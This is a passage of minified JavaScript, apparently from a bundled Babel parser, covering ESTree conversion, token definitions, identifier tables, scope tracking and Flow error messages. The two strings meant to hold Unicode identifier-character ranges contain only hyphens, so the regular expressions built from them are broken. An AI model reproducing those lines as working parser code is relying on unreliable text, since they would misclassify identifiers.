if(X.startColumn==null&&J.startIndex>0)J.startColumn=J.startIndex}else if(X.startColumn==null||X.startIndex==null){if(X.startIndex!=null)throw new Error("With a `startLine > 1` you must also specify `startIndex` and `startColumn`.")}if(J.sourceType==="commonjs"){if(X.allowAwaitOutsideFunction!=null)throw new Error("The `allowAwaitOutsideFunction` option cannot be used with `sourceType: 'commonjs'`.");if(X.allowReturnOutsideFunction!=null)throw new Error("`sourceType: 'commonjs'` implies `allowReturnOutsideFunction: true`, please remove the `allowReturnOutsideFunction` option or use `sourceType: 'script'`.");if(X.allowNewTargetOutsideFunction!=null)throw new Error("`sourceType: 'commonjs'` implies `allowNewTargetOutsideFunction: true`, please remove the `allowNewTargetOutsideFunction` option or use `sourceType: 'script'`.")}return J}var{defineProperty:gT}=Object,$K=(X,J)=>{if(X)gT(X,J,{enumerable:!1,value:X[J]})};function B5(X){return $K(X.loc.start,"index"),$K(X.loc.end,"index"),X}var hT=(X)=>class J extends X{parse(){let Q=B5(super.parse());if(this.optionFlags&256)Q.tokens=Q.tokens.map(B5);return Q}parseRegExpLiteral({pattern:Q,flags:Y}){let W=null;try{W=new RegExp(Q,Y)}catch(G){}let z=this.estreeParseLiteral(W);return z.regex={pattern:Q,flags:Y},z}parseBigIntLiteral(Q){let Y;try{Y=BigInt(Q)}catch(z){Y=null}let W=this.estreeParseLiteral(Y);return W.bigint=String(W.value||Q),W}parseDecimalLiteral(Q){let W=this.estreeParseLiteral(null);return W.decimal=String(W.value||Q),W}estreeParseLiteral(Q){return this.parseLiteral(Q,"Literal")}parseStringLiteral(Q){return this.estreeParseLiteral(Q)}parseNumericLiteral(Q){return this.estreeParseLiteral(Q)}parseNullLiteral(){return this.estreeParseLiteral(null)}parseBooleanLiteral(Q){return this.estreeParseLiteral(Q)}estreeParseChainExpression(Q,Y){let W=this.startNodeAtNode(Q);return W.expression=Q,this.finishNodeAt(W,"ChainExpression",Y)}directiveToStmt(Q){let Y=Q.value;delete Q.value,this.castNodeTo(Y,"Literal"),Y.raw=Y.extra.raw,Y.value=Y.extra.expressionValue;let W=this.castNodeTo(Q,"ExpressionStatement");return W.expression=Y,W.directive=Y.extra.rawValue,delete Y.extra,W}fillOptionalPropertiesForTSESLint(Q){}cloneEstreeStringLiteral(Q){let{start:Y,end:W,loc:z,range:G,raw:H,value:U}=Q,K=Object.create(Q.constructor.prototype);return K.type="Literal",K.start=Y,K.end=W,K.loc=z,K.range=G,K.raw=H,K.value=U,K}initFunction(Q,Y){super.initFunction(Q,Y),Q.expression=!1}checkDeclaration(Q){if(Q!=null&&this.isObjectProperty(Q))this.checkDeclaration(Q.value);else super.checkDeclaration(Q)}getObjectOrClassMethodParams(Q){return Q.value.params}isValidDirective(Q){var Y;return Q.type==="ExpressionStatement"&&Q.expression.type==="Literal"&&typeof Q.expression.value==="string"&&!((Y=Q.expression.extra)!=null&&Y.parenthesized)}parseBlockBody(Q,Y,W,z,G){super.parseBlockBody(Q,Y,W,z,G);let H=Q.directives.map((U)=>this.directiveToStmt(U));Q.body=H.concat(Q.body),delete Q.directives}parsePrivateName(){let Q=super.parsePrivateName();if(!this.getPluginOption("estree","classFeatures"))return Q;return this.convertPrivateNameToPrivateIdentifier(Q)}convertPrivateNameToPrivateIdentifier(Q){let Y=super.getPrivateNameSV(Q);return Q=Q,delete Q.id,Q.name=Y,this.castNodeTo(Q,"PrivateIdentifier")}isPrivateName(Q){if(!this.getPluginOption("estree","classFeatures"))return super.isPrivateName(Q);return Q.type==="PrivateIdentifier"}getPrivateNameSV(Q){if(!this.getPluginOption("estree","classFeatures"))return super.getPrivateNameSV(Q);return Q.name}parseLiteral(Q,Y){let W=super.parseLiteral(Q,Y);return W.raw=W.extra.raw,delete W.extra,W}parseFunctionBody(Q,Y,W=!1){super.parseFunctionBody(Q,Y,W),Q.expression=Q.body.type!=="BlockStatement"}parseMethod(Q,Y,W,z,G,H,U=!1){let K=this.startNode();K.kind=Q.kind,K=super.parseMethod(K,Y,W,z,G,H,U),delete K.kind;let{typeParameters:V}=Q;if(V)delete Q.typeParameters,K.typeParameters=V,this.resetStartLocationFromNode(K,V);let B=this.castNodeTo(K,"FunctionExpression");if(Q.value=B,H==="ClassPrivateMethod")Q.computed=!1;if(H==="ObjectMethod"){if(Q.kind==="method")Q.kind="init";return Q.shorthand=!1,this.finishNode(Q,"Property")}else return this.finishNode(Q,"MethodDefinition")}nameIsConstructor(Q){if(Q.type==="Literal")return Q.value==="constructor";return super.nameIsConstructor(Q)}parseClassProperty(...Q){let Y=super.parseClassProperty(...Q);if(!this.getPluginOption("estree","classFeatures"))return Y;return this.castNodeTo(Y,"PropertyDefinition"),Y}parseClassPrivateProperty(...Q){let Y=super.parseClassPrivateProperty(...Q);if(!this.getPluginOption("estree","classFeatures"))return Y;return this.castNodeTo(Y,"PropertyDefinition"),Y.computed=!1,Y}parseClassAccessorProperty(Q){let Y=super.parseClassAccessorProperty(Q);if(!this.getPluginOption("estree","classFeatures"))return Y;if(Y.abstract&&this.hasPlugin("typescript"))delete Y.abstract,this.castNodeTo(Y,"TSAbstractAccessorProperty");else this.castNodeTo(Y,"AccessorProperty");return Y}parseObjectProperty(Q,Y,W,z){let G=super.parseObjectProperty(Q,Y,W,z);if(G)G.kind="init",this.castNodeTo(G,"Property");return G}finishObjectProperty(Q){return Q.kind="init",this.finishNode(Q,"Property")}isValidLVal(Q,Y,W){return Q==="Property"?"value":super.isValidLVal(Q,Y,W)}isAssignable(Q,Y){if(Q!=null&&this.isObjectProperty(Q))return this.isAssignable(Q.value,Y);return super.isAssignable(Q,Y)}toAssignable(Q,Y=!1){if(Q!=null&&this.isObjectProperty(Q)){let{key:W,value:z}=Q;if(this.isPrivateName(W))this.classScope.usePrivateName(this.getPrivateNameSV(W),W.loc.start);this.toAssignable(z,Y)}else super.toAssignable(Q,Y)}toAssignableObjectExpressionProp(Q,Y,W){if(Q.type==="Property"&&(Q.kind==="get"||Q.kind==="set"))this.raise(b.PatternHasAccessor,Q.key);else if(Q.type==="Property"&&Q.method)this.raise(b.PatternHasMethod,Q.key);else super.toAssignableObjectExpressionProp(Q,Y,W)}finishCallExpression(Q,Y){let W=super.finishCallExpression(Q,Y);if(W.callee.type==="Import"){var z;this.castNodeTo(W,"ImportExpression"),W.source=W.arguments[0],W.options=(z=W.arguments[1])!=null?z:null;{var G;W.attributes=(G=W.arguments[1])!=null?G:null}delete W.arguments,delete W.callee}else if(W.type==="OptionalCallExpression")this.castNodeTo(W,"CallExpression");else W.optional=!1;return W}toReferencedArguments(Q){if(Q.type==="ImportExpression")return;super.toReferencedArguments(Q)}parseExport(Q,Y){let W=this.state.lastTokStartLoc,z=super.parseExport(Q,Y);switch(z.type){case"ExportAllDeclaration":z.exported=null;break;case"ExportNamedDeclaration":if(z.specifiers.length===1&&z.specifiers[0].type==="ExportNamespaceSpecifier")this.castNodeTo(z,"ExportAllDeclaration"),z.exported=z.specifiers[0].exported,delete z.specifiers;case"ExportDefaultDeclaration":{var G;let{declaration:H}=z;if((H==null?void 0:H.type)==="ClassDeclaration"&&((G=H.decorators)==null?void 0:G.length)>0&&H.start===z.start)this.resetStartLocation(z,W)}break}return z}stopParseSubscript(Q,Y){let W=super.stopParseSubscript(Q,Y);if(Y.optionalChainMember)return this.estreeParseChainExpression(W,Q.loc.end);return W}parseMember(Q,Y,W,z,G){let H=super.parseMember(Q,Y,W,z,G);if(H.type==="OptionalMemberExpression")this.castNodeTo(H,"MemberExpression");else H.optional=!1;return H}isOptionalMemberExpression(Q){if(Q.type==="ChainExpression")return Q.expression.type==="MemberExpression";return super.isOptionalMemberExpression(Q)}hasPropertyAsPrivateName(Q){if(Q.type==="ChainExpression")Q=Q.expression;return super.hasPropertyAsPrivateName(Q)}isObjectProperty(Q){return Q.type==="Property"&&Q.kind==="init"&&!Q.method}isObjectMethod(Q){return Q.type==="Property"&&(Q.method||Q.kind==="get"||Q.kind==="set")}castNodeTo(Q,Y){let W=super.castNodeTo(Q,Y);return this.fillOptionalPropertiesForTSESLint(W),W}cloneIdentifier(Q){let Y=super.cloneIdentifier(Q);return this.fillOptionalPropertiesForTSESLint(Y),Y}cloneStringLiteral(Q){if(Q.type==="Literal")return this.cloneEstreeStringLiteral(Q);return super.cloneStringLiteral(Q)}finishNodeAt(Q,Y,W){return B5(super.finishNodeAt(Q,Y,W))}finishNode(Q,Y){let W=super.finishNode(Q,Y);return this.fillOptionalPropertiesForTSESLint(W),W}resetStartLocation(Q,Y){super.resetStartLocation(Q,Y),B5(Q)}resetEndLocation(Q,Y=this.state.lastTokEndLoc){super.resetEndLocation(Q,Y),B5(Q)}};class vJ{constructor(X,J){this.token=void 0,this.preserveSpace=void 0,this.token=X,this.preserveSpace=!!J}}var w0={brace:new vJ("{"),j_oTag:new vJ("<tag"),j_cTag:new vJ("</tag"),j_expr:new vJ("<tag>...</tag>",!0)};w0.template=new vJ("`",!0);var K0=!0,w1=!0,mY=!0,q5=!0,p6=!0,yT=!0;class nY{constructor(X,J={}){this.label=void 0,this.keyword=void 0,this.beforeExpr=void 0,this.startsExpr=void 0,this.rightAssociative=void 0,this.isLoop=void 0,this.isAssign=void 0,this.prefix=void 0,this.postfix=void 0,this.binop=void 0,this.label=X,this.keyword=J.keyword,this.beforeExpr=!!J.beforeExpr,this.startsExpr=!!J.startsExpr,this.rightAssociative=!!J.rightAssociative,this.isLoop=!!J.isLoop,this.isAssign=!!J.isAssign,this.prefix=!!J.prefix,this.postfix=!!J.postfix,this.binop=J.binop!=null?J.binop:null,this.updateContext=null}}var aY=new Map;function O0(X,J={}){J.keyword=X;let Q=y1(X,J);return aY.set(X,Q),Q}function I9(X,J){return y1(X,{beforeExpr:K0,binop:J})}var j5=-1,A6=[],sY=[],oY=[],tY=[],eY=[],XW=[];function y1(X,J={}){var Q,Y,W,z;return++j5,sY.push(X),oY.push((Q=J.binop)!=null?Q:-1),tY.push((Y=J.beforeExpr)!=null?Y:!1),eY.push((W=J.startsExpr)!=null?W:!1),XW.push((z=J.prefix)!=null?z:!1),A6.push(new nY(X,J)),j5}function Z0(X,J={}){var Q,Y,W,z;return++j5,aY.set(X,j5),sY.push(X),oY.push((Q=J.binop)!=null?Q:-1),tY.push((Y=J.beforeExpr)!=null?Y:!1),eY.push((W=J.startsExpr)!=null?W:!1),XW.push((z=J.prefix)!=null?z:!1),A6.push(new nY("name",J)),j5}var mT={bracketL:y1("[",{beforeExpr:K0,startsExpr:w1}),bracketHashL:y1("#[",{beforeExpr:K0,startsExpr:w1}),bracketBarL:y1("[|",{beforeExpr:K0,startsExpr:w1}),bracketR:y1("]"),bracketBarR:y1("|]"),braceL:y1("{",{beforeExpr:K0,startsExpr:w1}),braceBarL:y1("{|",{beforeExpr:K0,startsExpr:w1}),braceHashL:y1("#{",{beforeExpr:K0,startsExpr:w1}),braceR:y1("}"),braceBarR:y1("|}"),parenL:y1("(",{beforeExpr:K0,startsExpr:w1}),parenR:y1(")"),comma:y1(",",{beforeExpr:K0}),semi:y1(";",{beforeExpr:K0}),colon:y1(":",{beforeExpr:K0}),doubleColon:y1("::",{beforeExpr:K0}),dot:y1("."),question:y1("?",{beforeExpr:K0}),questionDot:y1("?."),arrow:y1("=>",{beforeExpr:K0}),template:y1("template"),ellipsis:y1("...",{beforeExpr:K0}),backQuote:y1("`",{startsExpr:w1}),dollarBraceL:y1("${",{beforeExpr:K0,startsExpr:w1}),templateTail:y1("...`",{startsExpr:w1}),templateNonTail:y1("...${",{beforeExpr:K0,startsExpr:w1}),at:y1("@"),hash:y1("#",{startsExpr:w1}),interpreterDirective:y1("#!..."),eq:y1("=",{beforeExpr:K0,isAssign:q5}),assign:y1("_=",{beforeExpr:K0,isAssign:q5}),slashAssign:y1("_=",{beforeExpr:K0,isAssign:q5}),xorAssign:y1("_=",{beforeExpr:K0,isAssign:q5}),moduloAssign:y1("_=",{beforeExpr:K0,isAssign:q5}),incDec:y1("++/--",{prefix:p6,postfix:yT,startsExpr:w1}),bang:y1("!",{beforeExpr:K0,prefix:p6,startsExpr:w1}),tilde:y1("~",{beforeExpr:K0,prefix:p6,startsExpr:w1}),doubleCaret:y1("^^",{startsExpr:w1}),doubleAt:y1("@@",{startsExpr:w1}),pipeline:I9("|>",0),nullishCoalescing:I9("??",1),logicalOR:I9("||",1),logicalAND:I9("&&",2),bitwiseOR:I9("|",3),bitwiseXOR:I9("^",4),bitwiseAND:I9("&",5),equality:I9("==/!=/===/!==",6),lt:I9("</>/<=/>=",7),gt:I9("</>/<=/>=",7),relational:I9("</>/<=/>=",7),bitShift:I9("<</>>/>>>",8),bitShiftL:I9("<</>>/>>>",8),bitShiftR:I9("<</>>/>>>",8),plusMin:y1("+/-",{beforeExpr:K0,binop:9,prefix:p6,startsExpr:w1}),modulo:y1("%",{binop:10,startsExpr:w1}),star:y1("*",{binop:10}),slash:I9("/",10),exponent:y1("**",{beforeExpr:K0,binop:11,rightAssociative:!0}),_in:O0("in",{beforeExpr:K0,binop:7}),_instanceof:O0("instanceof",{beforeExpr:K0,binop:7}),_break:O0("break"),_case:O0("case",{beforeExpr:K0}),_catch:O0("catch"),_continue:O0("continue"),_debugger:O0("debugger"),_default:O0("default",{beforeExpr:K0}),_else:O0("else",{beforeExpr:K0}),_finally:O0("finally"),_function:O0("function",{startsExpr:w1}),_if:O0("if"),_return:O0("return",{beforeExpr:K0}),_switch:O0("switch"),_throw:O0("throw",{beforeExpr:K0,prefix:p6,startsExpr:w1}),_try:O0("try"),_var:O0("var"),_const:O0("const"),_with:O0("with"),_new:O0("new",{beforeExpr:K0,startsExpr:w1}),_this:O0("this",{startsExpr:w1}),_super:O0("super",{startsExpr:w1}),_class:O0("class",{startsExpr:w1}),_extends:O0("extends",{beforeExpr:K0}),_export:O0("export"),_import:O0("import",{startsExpr:w1}),_null:O0("null",{startsExpr:w1}),_true:O0("true",{startsExpr:w1}),_false:O0("false",{startsExpr:w1}),_typeof:O0("typeof",{beforeExpr:K0,prefix:p6,startsExpr:w1}),_void:O0("void",{beforeExpr:K0,prefix:p6,startsExpr:w1}),_delete:O0("delete",{beforeExpr:K0,prefix:p6,startsExpr:w1}),_do:O0("do",{isLoop:mY,beforeExpr:K0}),_for:O0("for",{isLoop:mY}),_while:O0("while",{isLoop:mY}),_as:Z0("as",{startsExpr:w1}),_assert:Z0("assert",{startsExpr:w1}),_async:Z0("async",{startsExpr:w1}),_await:Z0("await",{startsExpr:w1}),_defer:Z0("defer",{startsExpr:w1}),_from:Z0("from",{startsExpr:w1}),_get:Z0("get",{startsExpr:w1}),_let:Z0("let",{startsExpr:w1}),_meta:Z0("meta",{startsExpr:w1}),_of:Z0("of",{startsExpr:w1}),_sent:Z0("sent",{startsExpr:w1}),_set:Z0("set",{startsExpr:w1}),_source:Z0("source",{startsExpr:w1}),_static:Z0("static",{startsExpr:w1}),_using:Z0("using",{startsExpr:w1}),_yield:Z0("yield",{startsExpr:w1}),_asserts:Z0("asserts",{startsExpr:w1}),_checks:Z0("checks",{startsExpr:w1}),_exports:Z0("exports",{startsExpr:w1}),_global:Z0("global",{startsExpr:w1}),_implements:Z0("implements",{startsExpr:w1}),_intrinsic:Z0("intrinsic",{startsExpr:w1}),_infer:Z0("infer",{startsExpr:w1}),_is:Z0("is",{startsExpr:w1}),_mixins:Z0("mixins",{startsExpr:w1}),_proto:Z0("proto",{startsExpr:w1}),_require:Z0("require",{startsExpr:w1}),_satisfies:Z0("satisfies",{startsExpr:w1}),_keyof:Z0("keyof",{startsExpr:w1}),_readonly:Z0("readonly",{startsExpr:w1}),_unique:Z0("unique",{startsExpr:w1}),_abstract:Z0("abstract",{startsExpr:w1}),_declare:Z0("declare",{startsExpr:w1}),_enum:Z0("enum",{startsExpr:w1}),_module:Z0("module",{startsExpr:w1}),_namespace:Z0("namespace",{startsExpr:w1}),_interface:Z0("interface",{startsExpr:w1}),_type:Z0("type",{startsExpr:w1}),_opaque:Z0("opaque",{startsExpr:w1}),name:y1("name",{startsExpr:w1}),placeholder:y1("%%",{startsExpr:w1}),string:y1("string",{startsExpr:w1}),num:y1("num",{startsExpr:w1}),bigint:y1("bigint",{startsExpr:w1}),decimal:y1("decimal",{startsExpr:w1}),regexp:y1("regexp",{startsExpr:w1}),privateName:y1("#name",{startsExpr:w1}),eof:y1("eof"),jsxName:y1("jsxName"),jsxText:y1("jsxText",{beforeExpr:K0}),jsxTagStart:y1("jsxTagStart",{startsExpr:w1}),jsxTagEnd:y1("jsxTagEnd")};function C0(X){return X>=93&&X<=133}function uT(X){return X<=92}function I8(X){return X>=58&&X<=133}function lK(X){return X>=58&&X<=137}function cT(X){return tY[X]}function M5(X){return eY[X]}function lT(X){return X>=29&&X<=33}function kK(X){return X>=129&&X<=131}function pT(X){return X>=90&&X<=92}function JW(X){return X>=58&&X<=92}function dT(X){return X>=39&&X<=59}function iT(X){return X===34}function rT(X){return XW[X]}function nT(X){return X>=121&&X<=123}function aT(X){return X>=124&&X<=130}function r6(X){return sY[X]}function Y4(X){return oY[X]}function sT(X){return X===57}function G4(X){return X>=24&&X<=25}function O6(X){return A6[X]}A6[8].updateContext=(X)=>{X.pop()},A6[5].updateContext=A6[7].updateContext=A6[23].updateContext=(X)=>{X.push(w0.brace)},A6[22].updateContext=(X)=>{if(X[X.length-1]===w0.template)X.pop();else X.push(w0.template)},A6[143].updateContext=(X)=>{X.push(w0.j_expr,w0.j_oTag)};var QW="------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------",pK="-----------------------------------------------------------------------------------------------------------------------------------------------------",oT=new RegExp("["+QW+"]"),tT=new RegExp("["+QW+pK+"]");QW=pK=null;var dK=[0,11,2,25,2,18,2,1,2,14,3,13,35,122,70,52,268,28,4,48,48,31,14,29,6,37,11,29,3,35,5,7,2,4,43,157,19,35,5,35,5,39,9,51,13,10,2,14,2,6,2,1,2,10,2,14,2,6,2,1,4,51,13,310,10,21,11,7,25,5,2,41,2,8,70,5,3,0,2,43,2,1,4,0,3,22,11,22,10,30,66,18,2,1,11,21,11,25,71,55,7,1,65,0,16,3,2,2,2,28,43,28,4,28,36,7,2,27,28,53,11,21,11,18,14,17,111,72,56,50,14,50,14,35,39,27,10,22,251,41,7,1,17,2,60,28,11,0,9,21,43,17,47,20,28,22,13,52,58,1,3,0,14,44,33,24,27,35,30,0,3,0,9,34,4,0,13,47,15,3,22,0,2,0,36,17,2,24,20,1,64,6,2,0,2,3,2,14,2,9,8,46,39,7,3,1,3,21,2,6,2,1,2,4,4,0,19,0,13,4,31,9,2,0,3,0,2,37,2,0,26,0,2,0,45,52,19,3,21,2,31,47,21,1,2,0,185,46,42,3,37,47,21,0,60,42,14,0,72,26,38,6,186,43,117,63,32,7,3,0,3,7,2,1,2,23,16,0,2,0,95,7,3,38,17,0,2,0,29,0,11,39,8,0,22,0,12,45,20,0,19,72,200,32,32,8,2,36,18,0,50,29,113,6,2,1,2,37,22,0,26,5,2,1,2,31,15,0,328,18,16,0,2,12,2,33,125,0,80,921,103,110,18,195,2637,96,16,1071,18,5,26,3994,6,582,6842,29,1763,568,8,30,18,78,18,29,19,47,17,3,32,20,6,18,433,44,212,63,129,74,6,0,67,12,65,1,2,0,29,6135,9,1237,42,9,8936,3,2,6,2,1,2,290,16,0,30,2,3,0,15,3,9,395,2309,106,6,12,4,8,8,9,5991,84,2,70,2,1,3,0,3,1,3,3,2,11,2,0,2,6,2,64,2,3,3,7,2,6,2,27,2,3,2,4,2,0,4,6,2,339,3,24,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,7,1845,30,7,5,262,61,147,44,11,6,17,0,322,29,19,43,485,27,229,29,3,0,496,6,2,3,2,1,2,14,2,196,60,67,8,0,1205,3,2,26,2,1,2,0,3,0,2,9,2,3,2,0,2,0,7,0,5,0,2,0,2,0,2,2,2,1,2,0,3,0,2,0,2,0,2,0,2,0,2,1,2,0,3,3,2,6,2,3,2,3,2,0,2,9,2,16,6,2,2,4,2,16,4421,42719,33,4153,7,221,3,5761,15,7472,16,621,2467,541,1507,4938,6,4191],eT=[509,0,227,0,150,4,294,9,1368,2,2,1,6,3,41,2,5,0,166,1,574,3,9,9,7,9,32,4,318,1,80,3,71,10,50,3,123,2,54,14,32,10,3,1,11,3,46,10,8,0,46,9,7,2,37,13,2,9,6,1,45,0,13,2,49,13,9,3,2,11,83,11,7,0,3,0,158,11,6,9,7,3,56,1,2,6,3,1,3,2,10,0,11,1,3,6,4,4,68,8,2,0,3,0,2,3,2,4,2,0,15,1,83,17,10,9,5,0,82,19,13,9,214,6,3,8,28,1,83,16,16,9,82,12,9,9,7,19,58,14,5,9,243,14,166,9,71,5,2,1,3,3,2,0,2,1,13,9,120,6,3,6,4,0,29,9,41,6,2,3,9,0,10,10,47,15,343,9,54,7,2,7,17,9,57,21,2,13,123,5,4,0,2,1,2,6,2,0,9,9,49,4,2,1,2,4,9,9,330,3,10,1,2,0,49,6,4,4,14,10,5350,0,7,14,11465,27,2343,9,87,9,39,4,60,6,26,9,535,9,470,0,2,54,8,3,82,0,12,1,19628,1,4178,9,519,45,3,22,543,4,4,5,9,7,3,6,31,3,149,2,1418,49,513,54,5,49,9,0,15,0,23,4,2,14,1361,6,2,16,3,6,2,1,2,4,101,0,161,6,10,9,357,0,62,13,499,13,245,1,2,9,726,6,110,6,6,9,4759,9,787719,239];function dY(X,J){let Q=65536;for(let Y=0,W=J.length;Y<W;Y+=2){if(Q+=J[Y],Q>X)return!1;if(Q+=J[Y+1],Q>=X)return!0}return!1}function N6(X){if(X<65)return X===36;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&oT.test(String.fromCharCode(X));return dY(X,dK)}function fJ(X){if(X<48)return X===36;if(X<58)return!0;if(X<65)return!1;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&tT.test(String.fromCharCode(X));return dY(X,dK)||dY(X,eT)}var YW={keyword:["break","case","catch","continue","debugger","default","do","else","finally","for","function","if","return","switch","throw","try","var","const","while","with","new","this","super","class","extends","export","import","null","true","false","in","instanceof","typeof","void","delete"],strict:["implements","interface","let","package","private","protected","public","static","yield"],strictBind:["eval","arguments"]},X_=new Set(YW.keyword),J_=new Set(YW.strict),Q_=new Set(YW.strictBind);function iK(X,J){return J&&X==="await"||X==="enum"}function rK(X,J){return iK(X,J)||J_.has(X)}function nK(X){return Q_.has(X)}function aK(X,J){return rK(X,J)||nK(X)}function Y_(X){return X_.has(X)}function W_(X,J,Q){return X===64&&J===64&&N6(Q)}var G_=new Set(["break","case","catch","continue","debugger","default","do","else","finally","for","function","if","return","switch","throw","try","var","const","while","with","new","this","super","class","extends","export","import","null","true","false","in","instanceof","typeof","void","delete","implements","interface","let","package","private","protected","public","static","yield","eval","arguments","enum","await"]);function z_(X){return G_.has(X)}class z4{constructor(X){this.flags=0,this.names=new Map,this.firstLexicalName="",this.flags=X}}class H4{constructor(X,J){this.parser=void 0,this.scopeStack=[],this.inModule=void 0,this.undefinedExports=new Map,this.parser=X,this.inModule=J}get inTopLevel(){return(this.currentScope().flags&1)>0}get inFunction(){return(this.currentVarScopeFlags()&2)>0}get allowSuper(){return(this.currentThisScopeFlags()&16)>0}get allowDirectSuper(){return(this.currentThisScopeFlags()&32)>0}get allowNewTarget(){return(this.currentThisScopeFlags()&512)>0}get inClass(){return(this.currentThisScopeFlags()&64)>0}get inClassAndNotInNonArrowFunction(){let X=this.currentThisScopeFlags();return(X&64)>0&&(X&2)===0}get inStaticBlock(){for(let X=this.scopeStack.length-1;;X--){let{flags:J}=this.scopeStack[X];if(J&128)return!0;if(J&1731)return!1}}get inNonArrowFunction(){return(this.currentThisScopeFlags()&2)>0}get inBareCaseStatement(){return(this.currentScope().flags&256)>0}get treatFunctionsAsVar(){return this.treatFunctionsAsVarInScope(this.currentScope())}createScope(X){return new z4(X)}enter(X){this.scopeStack.push(this.createScope(X))}exit(){return this.scopeStack.pop().flags}treatFunctionsAsVarInScope(X){return!!(X.flags&130||!this.parser.inModule&&X.flags&1)}declareName(X,J,Q){let Y=this.currentScope();if(J&8||J&16){this.checkRedeclarationInScope(Y,X,J,Q);let W=Y.names.get(X)||0;if(J&16)W=W|4;else{if(!Y.firstLexicalName)Y.firstLexicalName=X;W=W|2}if(Y.names.set(X,W),J&8)this.maybeExportDefined(Y,X)}else if(J&4){for(let W=this.scopeStack.length-1;W>=0;--W)if(Y=this.scopeStack[W],this.checkRedeclarationInScope(Y,X,J,Q),Y.names.set(X,(Y.names.get(X)||0)|1),this.maybeExportDefined(Y,X),Y.flags&1667)break}if(this.parser.inModule&&Y.flags&1)this.undefinedExports.delete(X)}maybeExportDefined(X,J){if(this.parser.inModule&&X.flags&1)this.undefinedExports.delete(J)}checkRedeclarationInScope(X,J,Q,Y){if(this.isRedeclaredInScope(X,J,Q))this.parser.raise(b.VarRedeclaration,Y,{identifierName:J})}isRedeclaredInScope(X,J,Q){if(!(Q&1))return!1;if(Q&8)return X.names.has(J);let Y=X.names.get(J);if(Q&16)return(Y&2)>0||!this.treatFunctionsAsVarInScope(X)&&(Y&1)>0;return(Y&2)>0&&!(X.flags&8&&X.firstLexicalName===J)||!this.treatFunctionsAsVarInScope(X)&&(Y&4)>0}checkLocalExport(X){let{name:J}=X;if(!this.scopeStack[0].names.has(J))this.undefinedExports.set(J,X.loc.start)}currentScope(){return this.scopeStack[this.scopeStack.length-1]}currentVarScopeFlags(){for(let X=this.scopeStack.length-1;;X--){let{flags:J}=this.scopeStack[X];if(J&1667)return J}}currentThisScopeFlags(){for(let X=this.scopeStack.length-1;;X--){let{flags:J}=this.scopeStack[X];if(J&1731&&!(J&4))return J}}}class sK extends z4{constructor(...X){super(...X);this.declareFunctions=new Set}}class oK extends H4{createScope(X){return new sK(X)}declareName(X,J,Q){let Y=this.currentScope();if(J&2048){this.checkRedeclarationInScope(Y,X,J,Q),this.maybeExportDefined(Y,X),Y.declareFunctions.add(X);return}super.declareName(X,J,Q)}isRedeclaredInScope(X,J,Q){if(super.isRedeclaredInScope(X,J,Q))return!0;if(Q&2048&&!X.declareFunctions.has(J)){let Y=X.names.get(J);return(Y&4)>0||(Y&2)>0}return!1}checkLocalExport(X){if(!this.scopeStack[0].declareFunctions.has(X.name))super.checkLocalExport(X)}}var H_=new Set(["_","any","bool","boolean","empty","extends","false","interface","mixed","null","number","static","string","true","typeof","void"]),l1=r8`flow`({AmbiguousConditionalArrow:"Ambiguous expression: wrap the arrow functions in parentheses to disambiguate.",AmbiguousDeclareModuleKind:"Found both `declare module.exports` and `declare export` in the same module. Modules can only have 1 since they are either an ES module or they are a CommonJS module.",AssignReservedType:({reservedType:X})=>`Cannot overwrite reserved type ${X}.`,DeclareClassElement:"The `declare` modifier can only appear on class fields.",DeclareClassFieldInitializer:"Initializers are not allowed in fields with the `declare` modifier.",DuplicateDeclareModuleExports:"Duplicate `declare module.exports` statement.",EnumBooleanMemberNotInitialized:({memberName:X,enumName:J})=>`Boolean enum members need to be initialized. Use either \`${X} = true,\` or \`${X} = false,\` in enum \`${J}\`.`,EnumDuplicateMemberName:({memberName:X,enumName:J})=>`Enum member names need to be unique, but the name \`${X}\` has already been used before in enum \`${J}\`.`,EnumInconsistentMemberValues:({enumName:X})=>`Enum \`${X}\` has inconsistent member initializers. Either use no initializers, or consistently use literals (either booleans, numbers, or strings) for all member initializers.`,EnumInvalidExplicitType:({invalidEnumType:X,enumName:J})=>`Enum type \`${X}\` is not valid. Use one of \`boolean\`, \`number\`, \`string\`, or \`symbol\` in enum \`${J}\`.`,EnumInvalidExplicitTypeUnknownSupplied:({enumName:X})=>`Supplied enum type is not valid. Use one of \`boolean\`, \`number\`, \`string\`, or \`symbol\` in enum \`${X}\`.`,EnumInvalidMemberInitializerPrimaryType:({enumName:X,memberName:J,explicitType:Q})=>`Enum \`${X}\` has type \`${Q}\`, so the initializer of \`${J}\` needs to be a ${Q} literal.`,EnumInvalidMemberInitializerSymbolType:({enumName:X,memberName:J})=>`Symbol enum members cannot be initialized. Use \`${J},\` in enum \`${X}\`.`,EnumInvalidMemberInitializerUnknownType:({enumName:X,memberName:J})=>`The enum member initializer for \`${J}\` needs to be a literal (either a boolean, number, or string) in enum \`${X}\`.`,EnumInvalidMemberName:({enumName:X,memberName:J,suggestion:Q})=>`Enum member names cannot start with lowercase 'a' through 'z'. Instead of using \`${J}\`, consider using \`${Q}\`, in enum \`${X}\`.`,EnumNumberMemberNotInitialized:({enumName:X,memberName:J})=>`Number enum members need to be initialized, e.g. \`${J} = 1\` in enum \`${X}\`.`,EnumStringMemberInconsistentlyInitialized:({enumName:X})=>`String enum members need to consistently either all use initializers, or use no initializers, in enum \`${X}\`.`,GetterMayNotHaveThisParam:"A getter cannot have a `this` parameter.",ImportReflectionHasImportType:"An `import module` declaration can not use `type` or `typeof` keyword.",ImportTypeShorthandOnlyInPureImport:"The `type` and `typeof` keywords on named imports can only be used on regular `import` statements. It cannot be used with `import type` or `import typeof` statements.",InexactInsideExact:"Explicit inexact syntax cannot appear inside an explicit exact object type.",InexactInsideNonObject:"Explicit inexact syntax cannot appear in class or interface definitions.",InexactVariance:"Explicit inexact syntax cannot have variance.",InvalidNonTypeImportInDeclareModule:"Imports within a `declare module` body must always be `import type` or `import typeof`.",MissingTypeParamDefault:"Type parameter declaration needs a default, since a preceding type parameter declaration has a default.",NestedDeclareModule:"`declare module` cannot be used inside another `declare module`.",NestedFlowComment:"Cannot have a flow comment inside another flow comment.",PatternIsOptional:Object.assign({message:"A binding pattern parameter cannot be optional in an implementation signature."},{reasonCode:"OptionalBindingPattern"}),SetterMayNotHaveThisParam:"A setter cannot have a `this` 